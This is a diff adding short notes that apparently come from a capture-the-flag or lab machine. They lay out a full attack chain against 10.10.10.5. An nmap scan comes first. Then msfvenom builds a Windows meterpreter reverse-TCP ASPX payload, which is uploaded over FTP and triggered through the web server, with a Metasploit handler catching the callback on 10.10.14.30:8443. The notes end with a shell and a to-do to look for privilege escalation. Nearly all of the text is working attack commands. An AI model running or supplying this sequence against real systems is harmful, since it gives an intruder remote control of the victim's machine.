@@ -1,0 +1,16 @@
+nmap -T4 -A --top-ports 500 -oN nmap.txt 10.10.10.5
+# upload a reverse shell via ftp and trigger using the web server
+# payloads reference https://book.hacktricks.xyz/shells/shells/untitled
+msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.30 LPORT=8443 -o shell.aspx
+ftp 10.10.10.5
+put shell.aspx
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+options
+set lhost 10.10.14.30
+set lport 8443
+run
+# shell!
+shell
+# TODO hunt for priviledge escalation
